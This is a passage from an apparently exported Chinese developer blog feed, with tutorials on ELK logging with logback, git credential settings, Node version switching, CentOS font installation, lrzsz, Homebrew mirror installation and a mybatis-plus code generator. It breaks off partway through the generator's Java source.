class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 活动文件的名字会根据fileNamePattern的值，每隔一段时间改变一次 --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 文件名：log/api.2017-12-05.0.log --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>log/api.%d.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 每产生一个日志文件，该日志文件的保存期限为15天 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>  <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- maxFileSize:这是活动文件的大小，默认值是1MB，测试时可改成1KB看效果 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>1MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- pattern节点，用来设置日志的输入格式 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span></span><br><span class="line">                %d %p (%file:%line\)- %m%n</span><br><span class="line">            <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 记录日志的编码:此处设置字符集 - --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;LOGSTASH&quot;</span> <span class="attr">class</span>=<span class="string">&quot;net.logstash.logback.appender.LogstashTcpSocketAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- logstash地址，端口是logstash.conf input配置的端口 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">destination</span>&gt;</span>127.0.0.1:5000<span class="tag">&lt;/<span class="name">destination</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> <span class="attr">class</span>=<span class="string">&quot;net.logstash.logback.encoder.LogstashEncoder&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 控制台输出日志级别, 级别依次为【从高到低】：FATAL &gt; ERROR &gt; WARN &gt; INFO &gt; DEBUG &gt; TRACE --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;APILOG&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;LOGSTASH&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后，我们启动项目，日志就能实时追加到搭建的服务中去了。</p>
<h4 id="Kibana仪表盘设置"><a href="#Kibana仪表盘设置" class="headerlink" title="Kibana仪表盘设置"></a>Kibana仪表盘设置</h4><p>1，索引设置：<br>路径：设置 &gt;&gt; Kibana &gt;&gt; Index Patterns &gt;&gt; Create index pattern</p>
<p>Step1:<br>索引信息，支持根据通配符设置，如：logstash-*</p>
<p>Step2:<br>选择按照时戳作为筛选字段：@timestamp</p>
<p>注：仪表盘的这些索引设置，需要我们先写入日志数据</p>
<p>2，然后，进入Discover仪表盘，然后INDEX PATTERN选择logstash-*，就能查看日志了，如：<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/java/elk.png" alt="仪表盘"></p>
]]></content>
      <categories>
        <category>docker</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>ELK日志</tag>
      </tags>
  </entry>
  <entry>
    <title>Git记住密码设置</title>
    <url>/2020/06/15/git-remember-password/</url>
    <content><![CDATA[<h4 id="设置git记住密码"><a href="#设置git记住密码" class="headerlink" title="设置git记住密码"></a>设置git记住密码</h4><p>1，记住密码设置</p>
<p>进入git目录，执行下面的命令，长期保存账号信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure>
<p>或临时记住15分钟：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config -–global credential.helper cache</span><br></pre></td></tr></table></figure>
<p>注意：git config配置生效范围</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
<th>级别</th>
</tr>
</thead>
<tbody><tr>
<td><code>--system</code></td>
<td>表示针对整个系统的全局设置</td>
<td>最大范围</td>
</tr>
<tr>
<td><code>-–global</code></td>
<td>表示针对当前计算机登录的用户的全局设置</td>
<td>中等范围</td>
</tr>
<tr>
<td><code>--local</code></td>
<td>表示针对当前仓库设置</td>
<td>最小范围</td>
</tr>
</tbody></table>
<p>2，查看当前的git配置信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config -l</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">credential.helper&#x3D;osxkeychain</span><br><span class="line">user.name&#x3D;xxxxxxx</span><br><span class="line">user.email&#x3D;xxxx@xxxx.cn</span><br><span class="line">core.autocrlf&#x3D;false</span><br><span class="line">core.repositoryformatversion&#x3D;0</span><br><span class="line">core.filemode&#x3D;true</span><br><span class="line">core.bare&#x3D;false</span><br><span class="line">core.logallrefupdates&#x3D;true</span><br><span class="line">core.ignorecase&#x3D;true</span><br><span class="line">core.precomposeunicode&#x3D;true</span><br><span class="line">remote.origin.url&#x3D;https:&#x2F;&#x2F;github.com&#x2F;soilove4ln&#x2F;xxxx.git</span><br><span class="line">remote.origin.fetch&#x3D;+refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*</span><br></pre></td></tr></table></figure>
<p>如，需修改当前仓库的某一项，可使用如下方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --<span class="built_in">local</span> user.name <span class="string">&quot;soilove4ln&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="清除记住密码的设置"><a href="#清除记住密码的设置" class="headerlink" title="清除记住密码的设置"></a>清除记住密码的设置</h4><p>执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> credential.helper</span><br></pre></td></tr></table></figure>
<p>如果你需要清除其他参数设置，同样的，使用上述方法即可。</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>免密</tag>
      </tags>
  </entry>
  <entry>
    <title>node版本管理工具”n“的使用</title>
    <url>/2020/06/28/install-n/</url>
    <content><![CDATA[<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>我使用的是mac电脑，所以可直接用brew安装，命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install n</span><br></pre></td></tr></table></figure>
<p>安装完成后，可以通过<code>n --help</code>查看命令帮助。</p>
<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>1，查看所有可供安装的node版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n ls-remote --all</span><br></pre></td></tr></table></figure>
<p>2，选择版本安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo n 版本</span><br></pre></td></tr></table></figure>
<p>3，查看已经安装的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n ls</span><br></pre></td></tr></table></figure>
<p>4，切换版本，使用使用<code>n</code>命令，然后使用<code>上/下</code>键选择版本，回车即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo n</span><br></pre></td></tr></table></figure>
<p>5，查看当前使用的node版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>版本管理</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos安装中文字体</title>
    <url>/2020/09/15/linux-fonts/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;我们使用的Centos系统，默认情况下是没有安装中文字体的，所以如果你在代码中使用Graphics2D绘制中文，那必然会因为系统缺少字体而导致出现乱码的情况。<br>&nbsp;&nbsp;&nbsp;&nbsp;所以我们需要在系统上安装对应的字体来解决这个问题，本文以宋体为例。</p>
<p>字体下载：</p>
<ul>
<li><a href="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/linux/simsun.ttc">点击下载宋体-字体文件simsun.ttc</a></li>
</ul>
<p>注：其他字体可以到网上搜索下载，或Windows系统的字体目录下拷贝（C:\Windows\Fonts）</p>
<h4 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h4><h5 id="安装字体库和索引信息"><a href="#安装字体库和索引信息" class="headerlink" title="安装字体库和索引信息"></a>安装字体库和索引信息</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install fontconfig ttmkfdir mkfontscale</span><br></pre></td></tr></table></figure>
<h5 id="创建目录，上传字体文件"><a href="#创建目录，上传字体文件" class="headerlink" title="创建目录，上传字体文件"></a>创建目录，上传字体文件</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /usr/share/fonts/chinese</span><br><span class="line"><span class="built_in">cd</span> /usr/share/fonts/chinese</span><br></pre></td></tr></table></figure>
<p>注：创建chinese文件夹，并上传字体文件到此目录</p>
<h5 id="生成字体库索引信息"><a href="#生成字体库索引信息" class="headerlink" title="生成字体库索引信息"></a>生成字体库索引信息</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfontscale</span><br><span class="line">mkfontdir</span><br></pre></td></tr></table></figure>
<p>注：在路径/usr/share/fonts/chinese下执行上面的这两条命令</p>
<h5 id="更新字体缓存"><a href="#更新字体缓存" class="headerlink" title="更新字体缓存"></a>更新字体缓存</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fc-cache</span><br></pre></td></tr></table></figure>
<h5 id="查看字体安装情况"><a href="#查看字体安装情况" class="headerlink" title="查看字体安装情况"></a>查看字体安装情况</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fc-list :lang=zh</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>字体</tag>
      </tags>
  </entry>
  <entry>
    <title>lrzsz上传下载</title>
    <url>/2017/07/21/linux-lrzsz/</url>
    <content><![CDATA[<p>lrzsz是一款在linux里可代替ftp上传和下载的程序，小巧、高性能、方便易用。</p>
<h4 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h4><p>如果是centos，可以直接通过yum install lrzsz进行安装，也可以用下面的方式下载源文件进行安装。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://ohse.de/uwe/releases/lrzsz-0.12.20.tar.gz</span><br><span class="line">tar -zxvf lrzsz-0.12.20.tar.gz</span><br><span class="line"><span class="built_in">cd</span> lrzsz-0.12.20</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>安装之后，相关的命令文件在目录/usr/local/bin下，命令文件如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lrb lrx lrz lsb lsx lsz</span><br></pre></td></tr></table></figure>
<p>使用如下命令建立软链接，方便我们直接输出命令使用，我们这里就仅建立lrz上传和lsz下载的软链。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/bin</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/lrz rz</span><br><span class="line">ln -s /usr/<span class="built_in">local</span>/bin/lsz sz</span><br></pre></td></tr></table></figure>
<p> </p>
<h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><p>1，上传，使用“rz”命令，会呼起选择本地文件的窗口。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rz</span><br></pre></td></tr></table></figure>
<p>2，下载，使用“sz 文件地址”命令，会下载指定文件到本地，具体下载到本地的哪个目录可以在ssh工具上设置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sz ex.txt</span><br></pre></td></tr></table></figure>
<p>官网：<a href="https://ohse.de/uwe/software/lrzsz.html">https://ohse.de/uwe/software/lrzsz.html</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>rz/sz</tag>
      </tags>
  </entry>
  <entry>
    <title>mac安装homebrew工具</title>
    <url>/2020/06/28/mac-install-brew/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;Homebrew是mac重要的软件包管理工具，若是不装，那就等于失去了灵魂[摊手]。安装地址：<a href="https://brew.sh/index_zh-cn">brew官网</a></p>
<p>官网提供的安装方式如下，直接在mac终端执行即可，但是这下载速度，那就有点看不下去了，偶尔还超时中断，毕竟站点在国外，即使翻墙了 效果也不怎么样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>所以为了解决这个问题，我在网上搜索了其他的安装方式，找到了下面这种比较简单的方法，记录如下。</p>
<h4 id="国内镜像站点"><a href="#国内镜像站点" class="headerlink" title="国内镜像站点"></a>国内镜像站点</h4><table>
<thead>
<tr>
<th>镜像站</th>
<th>镜像地址</th>
</tr>
</thead>
<tbody><tr>
<td>中国科技大学镜像站</td>
<td><a href="https://mirrors.ustc.edu.cn/brew.git">https://mirrors.ustc.edu.cn/brew.git</a></td>
</tr>
<tr>
<td>阿里云镜像站</td>
<td><a href="https://mirrors.aliyun.com/homebrew/brew.git">https://mirrors.aliyun.com/homebrew/brew.git</a></td>
</tr>
<tr>
<td>清华大学镜像站</td>
<td><a href="https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git">https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git</a></td>
</tr>
</tbody></table>
<h4 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h4><p>1，我们选择科技大学的镜像站来安装，首先，先克隆brew到“/usr/local/Homebrew”目录，然后设置软链</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://mirrors.ustc.edu.cn/brew.git /usr/<span class="built_in">local</span>/Homebrew</span><br><span class="line">sudo ln -s /usr/<span class="built_in">local</span>/Homebrew/bin/brew /usr/<span class="built_in">local</span>/bin/brew</span><br></pre></td></tr></table></figure>
<p>2，继续克隆homebrew-core，并设置权限，运行更新命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://mirrors.ustc.edu.cn/homebrew-core.git /usr/<span class="built_in">local</span>/Homebrew/Library/Taps/homebrew/homebrew-core</span><br><span class="line">sudo chown -R $(whoami) /usr/<span class="built_in">local</span>/Homebrew</span><br><span class="line">brew update</span><br></pre></td></tr></table></figure>
<p>3，设置环境变量</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.zshrc </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles&#x27;</span> &gt;&gt; ~/.bash_profile</span><br><span class="line"><span class="built_in">source</span> ~/.zshrc</span><br><span class="line"><span class="built_in">source</span> ~/.bash_profile</span><br></pre></td></tr></table></figure>
<p>4，验证安装情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew doctor</span><br><span class="line">brew -v</span><br></pre></td></tr></table></figure>
<h4 id="更换brew镜像源"><a href="#更换brew镜像源" class="headerlink" title="更换brew镜像源"></a>更换brew镜像源</h4><p>如果你需要更换brew源，可以通过下面的方式重新设置</p>
<p>brew源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="subst">$(brew --repo)</span>&quot;</span></span><br><span class="line">git remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br></pre></td></tr></table></figure>
<p>homebrew-core源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;<span class="subst">$(brew --repo)</span>/Library/Taps/homebrew/homebrew-core&quot;</span></span><br><span class="line">git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br></pre></td></tr></table></figure>

<p>注明：本文参考文章-<a href="https://blog.csdn.net/u010458765/article/details/104730037/">国内Homebrew安装太慢 - 简单五步快速安装</a></p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>brew</tag>
      </tags>
  </entry>
  <entry>
    <title>代码生成工具(mybatis-plus-generator)</title>
    <url>/2020/09/18/mybatis-plus-generator/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;代码生成器，对于我们提升开发效率还是非常有价值的，快速生成代码和避免手误操作，能给我们减少了很多麻烦，又多了一点摸鱼的时间[偷笑]。<br>&nbsp;&nbsp;&nbsp;&nbsp;以前我用的比较多的是easy code，但是需要安装插件，配置模版，所以多少还是有些不方便。<br>&nbsp;&nbsp;&nbsp;&nbsp;自从项目改用mybatis-plus后，mybatis-plus-generator就成了它的替代品，很方便，也很灵活，个人推荐使用。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;下面我们使用一个Springboot多module的项目来做下演示。</p>
<h4 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h4><h5 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h5><p>下面的tree图，是我们本次演示的项目module和package结构，也是我们生成代码后的想要的效果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pro-mall</span><br><span class="line">├── pom.xml</span><br><span class="line">├── application</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">├── common</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">├── mapper</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src.main</span><br><span class="line">│           ├── java</span><br><span class="line">│           │   └── cn.soilove.expro</span><br><span class="line">│           │               ├── mapper</span><br><span class="line">│           │               │   └── user</span><br><span class="line">│           │               │       └── UserMapper.java</span><br><span class="line">│           │               └── model</span><br><span class="line">│           │                   └── user</span><br><span class="line">│           │                       └── User.java</span><br><span class="line">│           └── resources</span><br><span class="line">│               └── mapper</span><br><span class="line">│                   └── user</span><br><span class="line">│                       └── UserMapper.xml</span><br><span class="line">├── service</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src.main</span><br><span class="line">│           └── java</span><br><span class="line">│               └── cn.soilove.expro</span><br><span class="line">│                           └── service</span><br><span class="line">│                               └── user</span><br><span class="line">│                                   ├── UserService.java</span><br><span class="line">│                                   └── impl</span><br><span class="line">│                                       └── UserServiceImpl.java</span><br><span class="line">├── web-admin</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">├── web-api</span><br><span class="line">│   ├── pom.xml</span><br><span class="line">│   └── src</span><br><span class="line">└── web-open-api</span><br><span class="line">    ├── pom.xml</span><br><span class="line">    └── src</span><br></pre></td></tr></table></figure>
<h5 id="引入POM依赖"><a href="#引入POM依赖" class="headerlink" title="引入POM依赖"></a>引入POM依赖</h5><p>第一步，除开mybatis-plus正常引用的包，我们还需要引入generator和velocity，来提供代码和模版的生成。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mybatis-plus.version</span>&gt;</span>3.4.0<span class="tag">&lt;/<span class="name">mybatis-plus.version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">velocity.version</span>&gt;</span>2.2<span class="tag">&lt;/<span class="name">velocity.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatis-plus.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity-engine-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;velocity.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="编写工具类"><a href="#编写工具类" class="headerlink" title="编写工具类"></a>编写工具类</h5><p>然后，编写工具类，直接运行生成想要的代码。下面的java工具类是通过官网代码示例改造而来，支持多module指定。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.soilove.expro.framework.generator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.FieldFill;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.exceptions.MybatisPlusException;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.toolkit.StringPool;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.AutoGenerator;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.InjectionConfig;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.*;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.po.LikeTable;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.po.TableFill;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.po.TableInfo;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.DateType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;</span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.Maps;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MyBatisPlusGenerator 代码生成工具</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Chen GuoLin</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-02-11 11:57</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisPlusGenerator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 数据库链接信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String url = <span class="string">&quot;jdbc:mysql://k.32e.co:3306/ex-pro?allowMultiQueries=true&amp;useUnicode=true&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;useSSL=false&amp;zeroDateTimeBehavior=convertToNull&amp;&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String driver_name = <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String user = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String password = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * module子模块相对路径</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">module_path</span></span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * service类所在module</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String service = <span class="string">&quot;/service&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 表实体对象所在module</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String entity = <span class="string">&quot;/mapper&quot;</span>;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * mapper接口和xml文件所在module</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String mapper = <span class="string">&quot;/mapper&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 项目java包路径</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String base_path = <span class="string">&quot;cn.soilove.expro&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类的作者注释</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String author = <span class="string">&quot;Chen GuoLin&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String projectPath = System.getProperty(<span class="string">&quot;user.dir&quot;</span>);</span><br><span class="line"></span><br><span class="line">        String bizName = scanner(<span class="string">&quot;业务名称&quot;</span>);</span><br><span class="line">        String[] tableNames = scanner(<span class="string">&quot;表名(多个英文逗号分隔)&quot;</span>).split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 代码生成器</span></span><br><span class="line">        AutoGenerator autoGenerator = <span class="keyword">new</span> AutoGenerator();</span><br><span class="line">        autoGenerator.setGlobalConfig(buildGlobalConfig());</span><br><span class="line">        autoGenerator.setDataSource(buildDataSourceConfig());</span><br><span class="line">        autoGenerator.setPackageInfo(buildPackageConfig(projectPath,bizName));</span><br><span class="line">        autoGenerator.setCfg(buildInjectionConfig(projectPath, bizName));</span><br><span class="line">        autoGenerator.setTemplate(buildTemplateConfig());</span><br><span class="line">        autoGenerator.setStrategy(buildStrategyConfig(tableNames));</span><br><span class="line">        autoGenerator.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 